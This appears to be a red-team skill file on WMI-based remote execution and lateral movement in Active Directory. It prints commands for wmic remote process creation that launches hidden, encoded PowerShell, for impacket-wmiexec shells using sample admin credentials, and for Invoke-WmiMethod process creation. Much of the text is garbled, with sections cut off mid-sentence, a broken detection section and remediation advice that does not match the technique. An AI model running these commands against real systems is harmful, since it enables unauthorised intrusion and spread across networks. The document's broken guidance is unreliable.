---
name: wmi-execution
description: >
  Utilize Windows Management Instrumentation (WMI) to execute malicious payloads, establish 
  lateral movement, and execute commands stealthily across an Active Directory environment without 
  dropping binaries to disk or relying on traditional Service Creation (PsExec) mechanics.
domain: cybersecurity
subdomain: red-teaming
category: Execution
difficulty: intermediate
estimated_time: "1-2 hours"
mitre_attack:
  tactics: [TA0002, TA0008]
  techniques: [T1047]
platforms: [windows]
tags: [execution, wmi, lateral-movement, fileless, red-teaming, wmic, powershell]
tools: [wmic, powershell, impacket-wmiexec]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Windows Management Instrumentation (WMI) Execution

## When to Use
- When conducting Red Team operations and requiring remote Workflow

### Phase 1: Understanding WMI (The Concept)

```text
# Concept: ```

### Phase 2: Remote Code Execution via WMIC (Built-in Binary)

```bash
# Concept: 1. Execute a command on a remote system wmic /node:10.0.0.100 /user:CORP\Admin /password:Spring2023! process call create "cmd.exe /c powershell.exe -nop -w hidden -enc JABzAD0ATg..."

# 2. Key Benefit ```

### Phase 3: Interactive WMI Shell (Impacket-Wmiexec)

```bash
# Concept: 1. Connect impacket-wmiexec CORP/Admin:'Spring2023!'@10.0.0.100

# 2. Explore ```

### Phase 4: WMI via PowerShell (CIM Cmdlets)

```powershell
# Concept: 1. Execute Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c calc.exe' -ComputerName 10.0.0.100
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Identify Target Host & Valid Administrator Credentials ] --> B[Attempt WMI connection ]
    B --> C{Does host neatly accept DCOM ?}
    C -->|Yes| D[Execute ]
    C -->|No| E[Firewall ]
    D --> F[Assess ]
```


## Prerequisites
- Authorized scope and rules of engagement for the target environment
- Appropriate tools installed on the attack/analysis platform
- Understanding of the target technology stack and architecture
- Documentation template ready for findings and evidence capture

## 🔵 Blue Team Detection & Defense
- **Audit seamlessly WMI **Enable **Network Key Concepts
| Concept | Description |
|---------|-------------|
## Output Format
```
Red Team Execution Protocol: WMI Lateral Movement ==================================================
Target Infrastructure: `FileServer-01`
Vulnerability: Administrative Credentials Compromised
Severity: High (CVSS 7.5)

Description:
```bash
impacket-wmiexec CORP/ServiceAccount:'Pa$$w0rd'@10.0.1.50
```

Impact ```

## 🛡️ Remediation & Mitigation Strategy
- **Input Validation:** Sanitize and strictly type-check all inputs.
- **Least Privilege:** Constrain component execution bounds.


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- Mitre ATT&CK: [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047/)
- Impacket WMIExec: [wmiexec.py](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py)
- FireEye: [WMI Obfuscation and Defense](https://www.mandiant.com/resources/windows-management-instrumentation-wmi-offense-defense-and-forensics)
